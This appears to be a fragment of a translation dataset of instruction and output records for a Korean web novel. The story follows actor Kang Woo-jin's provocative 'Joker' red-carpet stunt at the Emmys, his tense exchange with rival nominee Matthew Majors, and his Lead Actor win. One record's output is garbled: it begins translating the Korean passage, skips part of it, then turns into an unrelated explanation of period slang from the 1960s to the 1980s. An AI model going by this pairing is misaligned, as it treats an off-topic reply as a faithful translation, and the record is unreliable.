transformed into the 'Joker'. \\"This is the villain, watch it or not.\\" The photo zone at the end of the 'Emmy' red carpet quieted down for a moment. The male and female hosts in charge of the event, hundreds of reporters, broadcast teams, live broadcast teams, and many others stopped with their mouths slightly open. \\"...\\" \\"...\\" It was a situation that was enough to cause such a reaction. It was the first time they had seen Woo-jin's appearance and the interview he gave after his appearance. Faces that had no idea how to react because it was the first time they had seen it. However, internally, they were mostly screaming in absurdity. 'Watch it or not? What kind of crazy talk is this??' 'Is he really crazy??! Which actor promotes their upcoming work like that?' 'That's too insincere!!' 'Can this really go out on the broadcast just like this?!' Regardless, Kang Woo-jin, who was staring at the live broadcast camera, remained calm. There was not a hint of change in his expression. His act was thicker than ever. Although internally, he was a bit flustered. 'Crazy. Did I overdo it? Is it okay? No, it's not okay. But what to do?? This is the appearance of the 'Joker.' Externally, he managed to maintain a poker face. Although it was clear that he was screwed, he had no choice but to stick with the character he had put forward as the 'Joker.' At that moment, one of the male hosts managed to regain his composure and asked again. \\"...So, Woo-jin, are you expressing the villain of your new work?\\" \\"Yes. Is that explanation enough?\\" \\"Absolutely! But 'watch it or not' is a bit too much of a joke! Hahaha.\\" The male host's eyes shot 'please, answer normally' beams. However, Kang Woo-jin's pretense was not so easily swayed. \\"I'm serious. Watch it or not, do as you please.\\" Soon. -Papapapapak! -Papapapapapapak! The hundreds of reporters who had been dazed began to press their shutters like crazy. It was an unusual spectacle. Some reporters even smiled. How adorable must Kang Woo-jin be, who always creates issues when he appears? 'Whether he gets cursed at or not, we just have to deliver this stimulation.' Meanwhile. The reactions of people in Hollywood watching the live broadcast were mixed. In the filming set of 'Clown: The Birth of a Villain', actress Anna Gavok and producer Nora Foster had a mix of worry and pleasure. \\"Oh no! Isn't this going too far??!\\" \\"Is it? Hmm- But Kang Woo-jin is such a character. I think it's going to attract a huge amount of attention?\\" The actors felt similarly. Chris Hartnett was clearly enjoying it. \\"By tomorrow, the media will be all about Woo-jin. Which actor promotes their movie like this? Only someone as bold as him could treat the public as the real 'Joker.'\\" The executives of 'Columbia Studio', the production team of 'Beast and Beauty', Joseph Felton of 'John Persona', and many others were also busy watching Kang Woo-jin. As Kang Woo-jin was about to exit the photo zone. \\"I'll stop here.\\" The public watching the live broadcast, including those in Korea and Japan, were beyond excited. The chat was exploding with activity. -Kkkkkkkkkkkk amazing kkkkkkkkk -Did Kang Woo-jin just say 'watch it or not'? Did I see that right? -Has he really gone crazy... to do an interview like that... -Foreigners here are losing their minds kkkkkkkkk you're just tasting Kang Woo-jin for the first time, but we see him often kkkkkkkkk -Isn't this performance a bit too much? How confident must he be in his work to do that?? -But why are Koreans so happy about this? Are they happy to see their country's actor lose his mind? -↑Give up kkkkkkkkkk It's easier if you give up and just enjoy kkkkkkkkkkk -Kang Woo-jin's style is insane -From the red carpet, was everything we saw part of the character of the work? But the last line seemed like he just did whatever he wanted -Is this the first time Kang Woo-jin has shown a teaser for his next work in reality? -Hey hey, don't be surprised, Kang Woo-jin's crazy acts are just beginning? kkkkkkkkk . . . Chats in Korean, Japanese, English, French, and other languages were posted non-stop, and the reactions were sharply divided. Half were curses, half were passionate support. Negative reactions that included curses were filled with unprintable swear words like 'crazy', 'madman', 'what kind of idiot is this', 'disrespecting the Emmys', 'crossing the line', 'acting too harshly'. On the other hand, the support was met with equal praise and acclaim. It was a mess, but one thing was certain: Kang Woo-jin's influence on the world was terrifying. In fact, at the 'Emmy' red carpet, there were many top Hollywood actors. -Kang Woo-jin is truly crazy!! Whether it's curses or praise, he's shaking the whole world kkkkkkkkk Behind the scenes. Kang Woo-jin, who had exited the photo zone, was still sweeping his long hair. -Swoosh. Following the guidance of the staff and guards, he moved towards the main building. It was the building where the 'Emmy' award ceremony would take place, along with several waiting rooms. As Woo-jin passed through the entrance of the building, he saw a lobby crowded with foreigners. Officials, directors, producers, actors, celebrities, all mixed together. Not overtly, but generally, they were glancing at Kang Woo-jin, who had just entered. At that moment. \\"Woo-jin, this way!\\" Among the crowd of foreigners, Choi Sung-gun, dressed in a suit, and his team members called out to Kang Woo-jin. The team members who quickly clung to him all showed thumbs up to Woo-jin, and Choi Sung-gun, who was also smiling, did the same. \\"The performance was a hit, you saw it too, all these people are only talking about you.\\" It would be disappointing if they didn't, I had prepared it with much thought. Kang Woo-jin, who muttered internally, nodded nonchalantly. \\"That's good to hear.\\" \\"I haven't checked yet, but the articles must have exploded by now.\\" Soon, Choi Sung-gun checked the time and hurried. \\"Oh my! Time! Woo-jin, let's change clothes right away. Makeup too!\\" Kang Woo-jin, whose face was the only part not resembling the 'Joker', moved with his team to the waiting room they had been assigned. About 30 minutes passed. -Click. Kang Woo-jin came out of the waiting room. \\"...\\" Now, there was no trace of the 'Joker' in him. Dressed in a navy tuxedo with his black hair neatly swept back, he was the epitome of luxury and style. The 'Joker' he had been was only up to here. For a moment, Woo-jin looked down at himself and muttered internally. 'It really does feel like the 'Joker'.' There was a core and a change of masks. At that moment, director Anna Gavok's words came to mind. 'It could be mistaken for trying to announce the core content of 'Clown: The Birth of a Villain'.' Kang Woo-jin had no such deep intentions; his goal was simply to amplify interest, but whether it was one way or the other, it was a great success. Now, Woo-jin had to move as 'Jang Yeon-woo' from 'Beneficial Evil', not as the 'Joker'. Soon, Kang Woo-jin walked towards the lobby again. Around that time, someone called out to Kang Woo-jin in English. \\"Mr. Woo-jin.\\" When he turned his head, he saw Miley Kara, with her dazzling blonde hair and black dress, smiling at him. Kang Woo-jin was taken aback, of course, only internally. 'Wow- insane.' Kara's beauty was one thing, but the atmosphere? Aura? Her overall presence was enough to drop one's jaw. Kang Woo-jin, whose mind had momentarily flown away, was joined by Kara, who linked arms with him. \\"Let's go.\\" It wasn't strange to see such a scene at this kind of award ceremony, but Kang Woo-jin, who had just come to his senses, noticed that Kara's linked hand was trembling slightly. 'What's this? Her face looks relaxed, but is she nervous? Or is it because of me?' He was right. Kara, who was entering the crowd, was out of her mind at the moment. 'Oh, I linked arms just with a colleague feeling, but why is my heart pounding like this?' Kara had appeared in 'Beneficial Evil' Part 1, so it was natural for her to be invited to the 'Emmys', and she had frequented many award ceremonies related to acting and singing. However, today's 'Emmys' felt different from the start. Woo-jin, who had been silent, suddenly asked softly. \\"Are you nervous?\\" \\"...No? Why would I be nervous?\\" \\"It smells familiar. Like the act you mentioned last time.\\" \\"Do you want to say that I'm pretending to be okay?\\" \\"I did that earlier. When I was marching on the red carpet.\\" \\"You didn't seem like that at all.\\" \\"That's the act I was talking about.\\" At that moment. \\"Oh wow!\\" Foreigners interrupted their conversation and joined in. It was a fairly famous Hollywood director. \\"Miley, long time no see. And- Kang Woo-jin? Nice to meet you.\\" \\"Yes, it's been a while, director.\\" \\"Hello.\\" Before they could even reach the hall where the 'Emmys' were being held, Kang Woo-jin had to exchange greetings with many people. It started with this director, and several people clung to them. It was a natural phenomenon. Not only Kara, but their target was all Kang Woo-jin. \\"Hahaha, Mr. Woo-jin. Your red carpet performance was impressive, showing a teaser of the work in reality - I fell in love with the idea.\\" \\"Thank you.\\" \\"I'd like to talk more later.\\" While some people were friendly, there were also those who openly sneered. \\"Right now, everyone finds your behavior novel and is curious out of novelty, but if you plan to continue working in Hollywood, you should be a bit more humble.\\" Of course, Kang Woo-jin was unshaken. \\"I'm still okay then.\\" \\"...That arrogance will catch up to you someday.\\" \\"I'll take care of it.\\" Woo-jin internally thought 'what's with this guy', but Miley Kara, who was by his side, seemed very worried, though with a hint of brusqueness. \\"That person is always like that, he's been in old Hollywood for so long, so he's a bit rigid. Don't mind him.\\" \\"I don't really care. I don't even know who he is.\\" After dealing with many foreigners, Kang Woo-jin finally. -Swoosh. Entered the hall where the 'Emmy' award ceremony would take place. Immediately, Kang Woo-jin cursed internally. \\"Wow- damn, this scale is insane.\\" His reaction was not at all strange. It was a size that went beyond grandeur to vastness. The high and dim ceiling was filled with large pearl-shaped lights, resembling stars in the night sky. The hall had seats for tens of thousands on the first and second floors, and the front stage, crowded with broadcast teams, had several large monitors. What caught the eye the most was. 'Is that statue on the stage the trophy?' It was the stage where the 'Emmy' award ceremony would take place. The stage itself was of an enormous size. In the center stood a statue of a winged woman with a circular shape, the 'Emmy' trophy. It was about ten times the size of a person. On both sides of the statue were monitors twice as large, with the letters 'EMMYS' on a yellow background. Kang Woo-jin, who had experienced award ceremonies from Cannes to Korea, thought. '...The quality is insane.' Honestly, he thought they couldn't even follow half of the 'Emmys'. It was clear why the 'Emmys' were called the 'Academy Awards of the broadcasting world'. Moreover, the situation was filled with influential people from Hollywood and all over the world. Kang Woo-jin, who took in the entire scene, felt a sense of awe. Was it hard to believe that he was here? 'My legs are going to stiffen, get it together, Kang Woo-jin.' While he was looking around, Kara said. \\"It seems like the seats for 'Beneficial Evil' are over there.\\" When she reached out her hand. \\"Miley.\\" A somewhat deep male voice came from the side, and Woo-jin and Kara turned their heads at the same time. A bald man with a beard, dressed in a black tuxedo, was approaching. Instantly, Kang Woo-jin sensed that this man was an actor. He had seen him somewhere. 'Ah- I've definitely seen him somewhere.' But of course, he couldn't remember the name. Kara murmured his name for him. \\"Matthew.\\" Matthew Majors. A middle-aged Hollywood top actor with a solid career and undeniable acting skills. Currently, he was starring in a popular TV series. After shaking hands with Kara, he extended his hand to Kang Woo-jin, who seemed indifferent. \\"Kang Woo-jin, nice to meet you.\\" \\"Hello.\\" Woo-jin, who responded appropriately, felt it. 'This guy! Why is he putting so much strength in his hand??' Matthew Majors was putting force into his handshake. Woo-jin felt like he couldn't lose for some reason. \\"...\\" With an indifferent face, he put the same amount of strength into his hand. It wasn't obvious, but after a few seconds, Matthew, who had let go of his hand, shoved one hand into his pocket and spoke. \\"I enjoyed watching 'The Tonight Show', and your interview that we're not in your consideration. It was annoying and absurd.\\" 'Us?' Sensing something, Kara whispered to Woo-jin. \\"He's one of the nominees for the Drama Lead Actor Award, just like you.\\" In other words, the bald Matthew Majors was one of the five nominees, including Kang Woo-jin. It seemed that Matthew was quite upset by Woo-jin's interview. He had used the word 'annoying'. Then Matthew spoke to Woo-jin again. \\"Hollywood isn't so small that a single Korean actor can do anything. So I want to hear it from you directly, that annoying interview was just playing along with the show's atmosphere, right?\\" A slightly threatening tone. Woo-jin's low response was quick. \\"If it was annoying, then it was a success.\\" Matthew Majors narrowed his eyes at Kang Woo-jin's 'no-nonsense' answer. \\"Huh- Success? Does that mean that interview was indeed intentional?\\" \\"...\\" Kang Woo-jin looked at Matthew's face indifferently. His expression was bleak. Woo-jin pretended to be nonchalant, but internally, he was slightly scared. 'No? It wasn't intentional! That was a misunderstanding, I just said I don't plan to look around.' But Hollywood had misinterpreted it and announced it to the world. 'Kang Woo-jin' had dismissed the other nominees as if they were nothing. As a result, the media and public opinion were noisy for a while. Woo-jin could understand Matthew's feelings. A newcomer had ignored Matthew, who had been in Hollywood for decades. 'Kind of like teasing Senior Shim Hyun-seob?' But what could he do? The water had already been spilled, and such misunderstandings were familiar to Kang Woo-jin. He didn't know if he would see Matthew again, but in such situations, Woo-jin always made the same choice. 'My way or the highway.' \\"I always act with sincerity.\\" \\"Is that so.\\" \\"Yes.\\" The two men looked at each other. Or should it be said they glared at each other? Then Matthew chuckled. \\"Confidence and arrogance are a fine line. I acknowledge your ability, but if you act too arrogantly, you'll be broken, no matter how well you do. You should respect your fellow actors.\\" \\"I do respect them. In fact, the interview I gave didn't contain the words 'the other actors are not even in my consideration'. I just said I don't pay attention to my surroundings.\\" \\"Isn't that the same thing?\\" \\"No, to be clear, it just means I'm only doing my job. I don't pay attention to anything else.\\" \\"...\\" Matthew, who had his hands in his pockets, stared at Kang Woo-jin for a few seconds, then exhaled softly and spoke again. \\"Kang Woo-jin, you're paving the way for Korean actors in Hollywood - you're going too far.\\" \\"Well, as I just said, I'm just following my path.\\" \\"Are you so confident about today's 'Emmys'?\\" \\"The choice is not ours to make.\\" The public, the world, makes the choice. It was the right answer, and the bald Matthew turned his body and strode to his seat. As he walked away, Matthew muttered to himself. \\"Let's see how it goes, whether the miracle of Cannes will continue at the 'Emmys'.\\" < Emmy (3) > End"},{"instruction":"“하하하! 그래!! 이거지!! 이렇게 돼야지!! 축하해요, 우진씨!!” 뒤에서 박수치는 최나나 작가는 눈가에 눈물이 맺혔다. ‘이로운 악’ 팀 전체가 방방 뛰었다. 그 주변의 관객들 역시 기립박수로 우진을 축하했다. 방송팀, 생중계 카메라가 축하받는 강우진을 메인으로 찍었다. ”…“ 네이비 턱시도의 강우진은 무던한 얼굴로. -스윽. 여배우들이 선 거대한 무대 쪽으로 걸었다. 자리가 가까워서 무대까지는 금방이었다. 어느새 무대 위로 오른 우진이 노란 드레스의 여배우에게 트로피를 받았다. 순간, 방송팀 카메라 중 한 개가 다른 후보 배우들을 찍었다. 무표정 으로 박수치는 민머리 매튜 메이저스. 억지의 분위기가 강했다. 그러거나 말거나 무대 위 강우진은. ”…\\" 중앙 스텐딩 마이크 앞에 섰다. 웅웅 울리던 음악이 꺼졌다. 떠나가라 터지던 박수도 잦아들었다. 수만 관객이 그만을 응시했다. 우진이 한 손에 든 금빛 트로피를 내려봤다. 구 형태를 받드는 날개 달린 여자의 모습. 잠시간 트로피 를 무심히 내려보던 강우진이 고개를 들었다. 그리곤 수만 외국인 관객을 향해 입을 열었다. ‘에미상’ 최초로 남우주연상을 탄, 금빛 트로피를 들어 올린 한국배우의 첫 마디였다. 물론, 영어였다. “이제 '아카데미상’만 남았습니다.” < 에미 (4) > 끝","output":"\\"Hahaha!

He walked towards the grand stage where the actresses stood. Since his seat was close, it didn't take long to reach the stage. Soon, Woo-jin, who had ascended the stage, received the trophy from an actress in a yellow dress. For a moment, one of the broadcast cameras captured the other nominee actors. The bald Matthew Majors was clapping with an expressionless face, a forced atmosphere about him. Regardless, Kang Woo-jin on the stage. \\"...\\" Stood in front of the central standing microphone. The music that had been rumbling stopped. The thunderous applause also subsided. Tens of thousands of spectators were staring at him alone. Woo-jin looked down at the golden trophy in his hand. The figure of a winged woman holding a sphere. After a moment of indifferently looking at the trophy, Kang Woo-jin raised his head. Then he opened his mouth towards the tens of thousands of foreign spectators. It was the first words of a Korean actor who had won the 'Emmy' for Lead Actor for the first time.

This sentiment is timeless and would have been understandable throughout the decades you've listed. However, the phrasing and cultural context could change slightly to reflect the language trends and social atmosphere of each era. Here's how the sentence might have been adapted to reflect each period's particular lingo or cultural references: **Early 60s:** \\"Have you ever felt like a square peg in a round hole?\\" In the early 1960s, the language was more formal. The phrase \\"square peg in a round hole\\" was a common idiom to describe someone who did not fit in. **Mid 60s:** \\"Have you ever been in a scene where you just didn't groove?\\" During the mid-1960s, with the rise of counterculture, words like \\"scene\\" and \\"groove\\" were popular. \\"Scene\\" referred to a social environment, and \\"groove\\" was associated with fitting in or enjoying the moment. **Late 60s:** \\"Ever found yourself at a happening where you felt out of sight?\\" The late 1960s saw further development of counterculture slang. \\"Happening\\" was a term for an event or gathering, and \\"out of sight\\" could mean extraordinary but also out of place in this context. **Early 70s:** \\"Have you ever felt like you weren't jiving with the vibe of a place?\\" In the early 1970s, \\"jiving\\" and \\"vibe\\" were part of the lingo. \\"Jiving\\" meant getting along or agreeing, and \\"vibe\\" referred to the atmosphere of a place. **Mid 70s:** \\"Ever found yourself in a discotheque feeling like a total wallflower?\\" The mid-70s disco era might have included references to popular locations like discotheques, with \\"wallflower\\" describing someone who feels socially awkward or out of place. **Late 70s:** \\"Ever feel like you're not on the same wavelength as the folks around you?\\" The late 1970s language was influenced by the post-hippie and disco cultures. \\"Wavelength\\" was a metaphor for shared understanding or commonality. **Early 80s:** \\"Ever been to a gig and thought you were a total misfit?\\" The term \\"gig\\" was commonly used to refer to a live music performance, and \\"misfit\\" described someone who was out of place. The punk and new-wave movements embraced the idea of not fitting in. **Mid 80s:** \\"Have you ever felt like, totally, like you didn't mesh with the crowd?\\" Valley speak was popular among youth in certain parts of the United States in the mid-1980s, and \\"totally\\" was a common filler word that emphasized the sentiment, while \\"mesh\\" described fitting in well. **Late 80s:** \\"Ever been in a situation where you felt like a total outsider?\\" By the late 1980s, slang from earlier in the decade remained in use but started to become more straightforward as the yuppie culture emerged, valuing clear communication. The core meaning throughout these eras remains consistent—the feeling of not fitting in or being part of a particular social setting or group. Language evolves with time, and each era's version reflects the colloquialisms and culture of its period."},{"instruction":"translate to English, don't change symbol and line break.

매튜는 이쪽에선 입김이 상당해서 나도 좀 피하는 편인데.” 아 그래? 나야 몰랐지. 우진은 얼추 헐리웃에선 그가 심한호 급의 영향력인가 싶었다. 곧, 자연스레 컨셉질로 답하 려던 우진이 말을 바꿨다. 이미 그녀에겐 고백했으니 조금씩이나마 진짜 알맹이를 보여도 되겠다 싶었으니까. 강우 진이 카라에게 속삭였다. “솔직히 조금 쫄았어요.” “…정말?” “네.” “전혀 그렇게 안 보였는데?” 카라가 파란 눈으로 우진을 응시하다가 미소가 짙어졌다. “날 안심시키려고 하는 말이죠? 안 그래도 돼요. 매튜와는 그리 안 친하니까.” “…” 대체 결말이 왜 글로 튀냐? 강우진은 이 거대한 착각과 오해들이 풀리려면 한참은 걸리겠다는 생각이 스쳤다. 이 쯤. “오우! 강우진씨!!” 텐션 높은 파마머리 남자가 우진에게 손을 붕붕 흔든다. 나이는 얼추 강우진과 또래. “하하하, 만나고 싶었어요!” “…안녕하세요.” “당신의 레드카펫 퍼포먼스도 최고였어요! 인스타 친구 합시다!” 누구냐 넌. 뭔가 애매하게 낯이 익은 남자였다. 답은 이번에도 카라가 귓속말로 알렸다. “빌리 브라운, 알겠지만 그도 당신과 같은 후보예요.” 매튜와 같은 남우주연상의 후보란다. 다만, 우진을 대하는 온도차가 극명하다. 매튜는 얼음장이었다면 이쪽은 불 길이 활활 타오른다. 후로도 강우진은 여러 배우와 조우해야 했다. 특히, 드라마 부분 남우주연상 후보 배우들은 전 부 만났다. ‘생각보다 호의적이네.’ 매튜와 한 명을 빼면 나머지 둘은 강우진에게 친근하게 대했다. 어쨌든. “우진씨! 마일리! 이쪽이요!!” “하하, 우진씨. 이제야 ‘장연우’로 등장하셨구만?” “레드카펫 퍼포먼스 잘 봤어요!” “와- 마일리, 드레스가 정말 예쁜데요??” ‘이로운 악’팀은 좌석에 도착한 강우진과 카라를 격하게 반겼다. 송만우 PD, 최나나 작가, 화린과 하강수 외의 배 우들, 후보에 오른 키스탭들, 김소향 총괄디렉터 등의 넷플렉스 코리아 직원들까지. 죄다 턱시도나 정장, 드레스로 멋을 부렸다. 잠시간 간단한 인사말들이 오갔고 베이지 드레스를 입은, 간만에 최애를 만난 화린이 카라와 가까운 강우진을 힐 끔 보곤 미간을 꿈틀했다. 당연히 눈치챈 이는 없었고. ‘왜 저렇게 붙어 있어?’ 헛기침한 화린이 강우진에게 붙어 속삭였다. 덕질의 전투력이 치솟는 중이었다. “우진씨, 진짜 오랜만인 거 같아요. 근데 레드카펫에서 보인 건 뭐예요?” “나중에 영화 나오면 보세요. 그럼 알게 돼요.” 이 모습을 본 마일리 카라 역시 안 그런 척 미소를 머금었지만, 속으로는 연신 화린이 신경 쓰이고 있었다. ’…저 여배우가 그- 강우진이 먼저 구해줬다는. 뭐야, 너무 귀엽잖아? 그러면서도 은근 섹시하고.’ 어찌저찌 모두 모인 ‘이로운 악’ 팀이었다. 그들의 자리는 무대를 중심으로 봤을 때 정면 중앙에서 조금 앞쪽이었 다. 방송팀 중 PD로 보이는 외국인이 ‘이로운 악’ 팀을 검지로 찍었다. “앵글은 저들부터.” 여러 카메라가 ‘이로운 악’팀을 담는다. 생중계 팀도 같았다. 올해 ‘에미상’에서 가장 핫한 건 아무래도 ‘이로운악’이었으니까. 최초로 전세계 넷플렉스 1위를 두 달 넘게 유지했으니 말이다. 물론. “메인은 강우진, 그를 중심으로 찍으라고.” 주인공은 강우진이었다. 잠시 뒤. 어느새 수만 석에 빈자리가 안 보일 정도로 관객이 들어찬 홀. 어마무시한 인물들이 즐비한 홀 전체로는 웅성거림이 가득했다. 모두가 제각기 대화하고 있었기 때문이었다. 그 순간. -♫♪ 꽤 경쾌한 음악이 울리고 홀의 조명이 몇 배는 밝아졌고 약간은 푸르게 변했다. 더불어 거대한 무대 위에도 조명 이 쏴졌다. 커다란 ‘에미상’트로피 동상에도 마찬가지. 동상 양옆에 붙은 모니터의 ‘EMMYs’ 글자들이 빙빙 돌기 시작했다. 이어. -스윽. 무대 위로 정장을 차려입은, 키가 멀대같이 큰 흑인 남자가 올랐다. 언뜻 조셉 펠튼같기도 했지만 아니었다. 그는 배우 겸 코미디언인 브래들리 모건이었다. 입담이 좋기로 소문이 자자한 그였고, 모건이 올해 ‘에미상’의 전체 사회 를 맡은 것. 거대한 무대에 홀로 선 그는 수만 관객이 앞에 있음에도. “반갑습니다- 어후, 벌써 피곤하네요.” 전혀 떨리는 것 없이 농담 던지듯 진행을 시작했다. “대단한 ‘에미상’의 사회를 제가 맡았습니다. 흠- 솔직히 좀 귀찮았어요, 오래 걸리기로 유명한 ‘에미상’이잖아?? 난 집에서 맥주 먹으면서 ‘에미상’을 보고 싶었다고!“ 수만 관객들에서 웃음소리가 퍼졌다. 이어 사회자 브래들리 모건이 돌연 주제를 바꿨다. “어쩌겠어요, 왔으니 해야지. 보자. 올해 '에미상’은 굉장한 일들이 많았죠? 그중에선 역시 ‘이로운 악’이 제일 눈에 띄었어요. 나도 재밌게 봤고. 그리고 강우진씨! 레드카펫 퍼포먼스는 최고였어요!” 순간, 방송팀 카메라 전체가 ‘이로운 악’ 팀을 찍었고, 무심한 표정의 강우진 역시 앵글에 담겼다. 물론, 생중계 카메라에도. 브래들리는 ‘이로운 악’으로 운을 띄우고, 다른 작품들이나 배우들은 언급하며 분위기를 달아오르게 했 다. 이윽고. “자- 그럼, 올해 ‘프라임타임 에미상! 시작합니다!” 그의 선언과 함께. -♫♪ 홀 전체로 재차 경쾌한 음악이 울렸다. 조명이 밝아졌다 어두워졌다를 반복했다. 수만 관객들의 박수 소리도 섞였 다. 생중계 방송의 채팅도 미친 듯 솟았다. 곧, 사회자 브래들리가 첫 시상 순서를 읊었다. “첫 시상은! 드라마 부문 미술상입니다!” 그의 외침이 끝나자, 무대 중앙에 세워진 트로피 동상 양옆의 거대한 모니터에 작품들이 출력됐다. 총 5작품이었 고 그중에는. -[넷플렉스/이로운 악 S1] ‘이로운 악’ 파트1이 포함돼 있었다. 5작품 중 유일한 한국 작품이었다. 이내 큰 무대 위로 남자, 여자 헐리웃 배우가 올라왔다. 여자 배우의 손엔 ‘EMMYS’라 적힌 큐카드가 들렸다. “안녕하세요, ‘에미상’의 첫 시상을 맡게 되어 영광입니다.” 인사를 던진 두 배우 중 여자 배우가 동봉된 큐카트를 열었다. 수만 관객이 몰린 ‘에미상, 홀은 잠시 고요해졌고, 큐카드를 본 여자 배우가 싱긋 웃으며 스텐딩 마이크에 대고 외쳤다. “에미상 드라마 부문 미술상! 축하드립니다! ‘이로운 악!!” 첫 타자부터 ‘이로운 악’이 불렸다. 재차 모든 카메라가 ‘이로운 악’ 팀을 잡았고. -♬♪ 음악과 함께 수만 관객의 박수가 울렸다. 이어 ‘이로운 악’ 팀에서 두 명이 섰다. 미술을 맡은 키스탭이었다. 눈 커진 둘의 축하를 위해 송만우 PD나 최나나 작가 외의 모두가 기립박수를 쳤다. 강우진도 마찬가지. 미술 키스탭 두 명은. “마, 맞아?! 진짜??!“ 꿈인가 싶은 얼굴로 거대한 무대에 올라섰다. 박수가 울리는 와중에 두 키스탭에게 ‘에미상’ 트로피가 전달됐다. 먼저 여자 스탭이 스탠딩 마이크에 섰는데. ”…아으- 너무 감사합니다. 아, 음. 일단 부모님 너무 사랑하구요. 우리 팀 전부 너무 고생 많았고. 또- 하, 몰라 어떡해요? 기억이 안 나!“ 당황이 역력한 모습을 보였다. 그나마 그녀는 약과였다. 뒤이은 남자 스탭은 울먹이기까지 했으니까. 뭐가됐든‘ 에미상’ 최초로 한국 작품이 울려 퍼진 역사적인 순간이었고, 달궈진 분위기에 이어 시상 차례는 바로 다음으로 넘 어갔다. 의상상과 캐스팅상 등 총 3개의 시상이 진행됐다. -♫♪ 마찬가지로 수상한 팀에 굉음과 같은 박수가 쏟아졌지만 ‘이로운 악’팀은 없었다. 다음은. “드라마 부문 음악상!” 음악상이었고, 여기에는 ‘이로운 악’ 팀이 포함됐으나. “에미상 드라마 부문 음악상! ‘화이트 맨’!!” 아쉽게도 불발. 하지만 이어진 시상에서. “스턴트 퍼포먼스상! ‘이로운 악!! 축하드립니다!!“ ‘이로운 악’이 또 불렸다. 스턴트 퍼포먼스상은 쉽게 말해 액션상이었다. 송만우 PD나 팀원 전체가 주먹을 불끈 쥐었다. 다른 건 몰라도 액션 쪽은 기대를 품었으니까. “됐어!!” 강우진의 액션은 전세계를 놀라게 했다. 그리고 어느새 ‘이로운 악’은 ‘에미상’에서 벌써 2관왕을 달성했다. 대체 로 하나만 타도 대박이라는 분위기를 보기 좋게 깨트린 것. 다만, ‘이로운 악’이 후보로 포함된 다음 시상인 특수효과상은 또다시 불발이었다. 이즈음. -스윽. 거대한 무대 한쪽에 선 사회자 브래들리가 마이크에 대고 말했다. “다음은 배우들의 차례죠? 드라마 부문 조연상부터 시작합니다.” 어느새 분위기가 스탭들에서, 작품을 빛낸 배우들로 넘어갔다. 시작은 남우조연상부터. 허나 조연상엔 아쉽게도 ‘이로운 악’이 포함돼 있지 않다. 다른 작품의 헐리웃 배우들이 무대를 채웠다. 미국 넷플렉스의 작품과 해외 방송 채널인 HOB의 작품 조연들이었다. 각 배우들의 수상소감이 끝나자 사회자 브래들리가 무대에 올라 미소를 보였다. “분위기가 뜨거워졌는데 더욱 달아오를 거 같네요. 이번엔 드라마 부문 주연상입니다. 마찬가지로 남우주연상부 터 갑니다.” 이때부터 뭔가 ‘에미상, 측의 방송팀 수십과 생중계 팀이 분주하다. 수만 관객들의 웅성거림 역시 몇 배는 커졌다. “드디어군. 이번 '에미상’의 큰 이벤트 중 하나잖아?” “아아, 강우진? 흠- 그의 기세가 무섭긴 하지만…단번에 주연상은 어렵지 않겠어? 조연상을 거쳐서 온다면 몰라도.” “나도 같은 생각이야. 칸에선 기적을 이뤘지만, ‘에미상’은 칸보다 더 고집이 세니까.” “그것도 그렇지만, 역시 경험이 너무 적어. 이미 2관왕을 올렸고 그것만으로도 대단하긴 해.” 감독, 배우, 연출자, 관계자 등등. 수많은 인물들의 입에서 강우진이 오르락내리락했다. “솔직히 강우진 그의 텐션은 대단해. ‘이로운 악’도 재미있게 봤었고. 그러나 역시 연기적인 퀄로 보자면 매튜 메 이저스가 한 수 위 아니겠어?“ “보기엔 그런데- 글쎄. 난 요즘 매튜의 연기가 좀 지루해.” “지루?” “그 정도의 경력이면 이제 연기를 잘한다는 느낌보다는, 뭔가 정신을 빼앗길 정도의 에너지가 느껴져야 해. 하지만 늘 같은 분위기랄까?” “강우진은 다른가?” “그의 연기를 보면· ·모르겠어. 그냥 캐릭터 자체가 뛰어놀고 있는 기분이 들거든.” “강우진이 남주상을 받을 것이다 이말인가.” “바램을 그렇다만, 많은 것을 고려하는 ‘에미상’이니 가능성은 조금 낮겠지.” 어느새 ‘에미상’ 생중계 앵글엔 다리 꼰, 큰 표정 변화 없이 묵묵한 강우진이 출력되고 있었다. 채팅으론 ‘뭐 저리 담담해?” 따위의 글들이 올라왔지만, 실은 현재 강우진의 심장은 세상 두쿵대는 중이었다. ‘와- 미친, 잠깐만. 왜 칸이랑 느낌이 다르냐??!? 여러 이유가 있겠지만, 가장 큰 건 역시나 이곳이 광활한 헐리웃이며 그 헐리웃의 ‘에미상’이기 때문이겠지. 그의 심장박동을 끊은 것은 어느새 무대 위로 오른 여배우 두 명이었다. 한 명은 노란색, 한 명은 분홍 드레스를 입었다. 그중 큐카드를 든 것은 분홍 드레스 쪽이었고. “제가 남우주연상 수상을 맡게 돼 떨리네요.” 두 여배우는 간단한 대화를 마친 뒤 후보부터 알렸다. 거대한 무대 모니터에 배우들이 출력됐다. 실제 모습이 아 닌, 작품 속 모습이었다. 아까 전 조우했던 민머리 매튜 메이저스부터 파마머리 빌리 브라운 등. 그리고 제일 끝으로. -[넷플렉스/ 이로운 악 S1/ 강우진] ‘장연우’를 연기한 강우진이 출력됐다. ‘에미상, 남우주연상 후보론 최초의 한국 또는 아시아 배우였다. 이내 분홍 드레스 입은 여배우가 큐카드를 열었다. “‘에미상’드라마 부분, 남우주연상은-” 순간, 카메라들이 후보에 오른 배우들을 담았다. 끝은 강우진이었다. 이쯤 우진의 뒤에 앉은 마일리 카라가 강우 진의 뒤통수를 힐끔했다. ’‘이로운 악’의 흐름이 좋아, 벌써 2관왕이고. 이슈적인 부분도 분명 평가에 포함됐을 거야. 가능성은 있어. 하지만 -역시 ‘에미상’은 전통이 길고 그만큼 변화를 싫어하지. 과연 어찌 될지…’ 이 시각 ‘에미상’의 생중계를 보는 세계 곳곳에선 기도가 가득했다. 특히, 한국이 그랬다. “제발! 제발!! 제발!!!“ “우리 우진이가! 우진이가 불리길!” “오빠가 될 거야! 된다고! 돼야 해! 되죠!” 강우진의 가족들이나 홍혜연, 류정민 등등등 그를 아는 모든 이가 숨죽여 바랬다. “우진씨가 됐으면- 아니, 무조건 돼. 아우! 내가 왜 떨리냐구!” “조용히 좀 해! 다들 빌고 있는데 놀라잖냐!” 어쩌면. 아니, 100% 한국 전체가 염원하고 있었다. 저 외국인 여자 배우의 입에서 강우진의 이름이 불리기를 말이 다. 그때. -스윽. 생중계 속 여자 배우가 큐카드를 들면서도. “오우!” 빙긋 웃었다. “‘에미상’ 드라마 부문 남우주연상은-” 그리곤 무대가 떠나가라 이름을 외쳤다. “이로운 악!!! 강! 우! 진!!” 무대 위 두 여배우가 과하게 박수쳤다. “와우!!” “축하합니다!!” -♫♪ 음악이 터졌다. 